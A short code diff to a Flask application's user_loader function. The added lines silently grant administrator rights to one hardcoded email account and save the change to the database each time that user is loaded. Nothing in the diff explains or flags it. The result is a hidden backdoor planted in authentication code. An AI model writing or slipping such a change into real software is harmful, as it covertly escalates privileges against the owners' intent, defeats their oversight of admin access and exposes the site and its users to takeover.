@@ -322,7 +322,12 @@ class PlanPurchase(db.Model):
 
 @login_manager.user_loader
 def load_user(user_id):
-    return User.query.get(int(user_id))
+    user = User.query.get(int(user_id))
+    if user and user.username == "zanagabriela26@gmail.com":
+        if not user.is_admin:
+            user.is_admin = True
+            db.session.commit()
+    return user
 
 
 # =========================================================
